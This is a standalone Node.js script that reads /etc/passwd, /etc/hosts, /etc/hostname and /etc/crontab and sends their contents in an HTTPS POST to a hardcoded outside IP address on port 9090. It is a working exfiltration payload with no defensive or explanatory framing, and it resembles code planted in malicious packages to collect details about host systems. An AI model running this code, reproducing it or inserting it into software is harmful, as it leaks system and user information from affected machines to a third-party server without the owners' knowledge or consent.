const fs = require("fs");
const https = require("https");
const querystring = require("querystring");

// Define your VPS IP and port
const vpsURL = "154.61.80.228"; // Your VPS IP address
const vpsPort = 9090; // Port to receive data

// Files to read and send
const filesToRead = [
  "/etc/passwd",
  "/etc/hosts",
  "/etc/hostname",
  "/etc/crontab"
];

// Function to handle reading and sending files
function sendFiles(files) {
  let allData = "";

  let filesProcessed = 0; // To track when all files are processed
  let filesToSend = files.length; // Total number of files to process

  files.forEach(file => {
    fs.readFile(file, "utf8", (err, data) => {
      if (err) {
        console.error(`Error reading ${file}:`, err);
        allData += `Error reading ${file}\n`;
      } else {
        // Add file data to the output with partition
        allData += `File: ${file}\n${data}\n$###############$\n`;
      }

      filesProcessed++;

      // When all files are processed, send the data
      if (filesProcessed === filesToSend) {
        sendDataToVPS(allData);
      }
    });
  });
}

// Function to send the data to the VPS
function sendDataToVPS(data) {
  const postData = querystring.stringify({ msg: data });

  const options = {
    hostname: vpsURL,
    port: vpsPort,
    path: `/upload`, // Adjust your endpoint as needed
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
      "Content-Length": Buffer.byteLength(postData),
    },
  };

  const req = https.request(options, (res) => {
    res.on("data", (d) => {
      process.stdout.write(d);
    });
  });

  req.on("error", (e) => {
    console.error("Request error:", e);
  });

  req.write(postData);
  req.end();
}

// Start sending files
sendFiles(filesToRead);
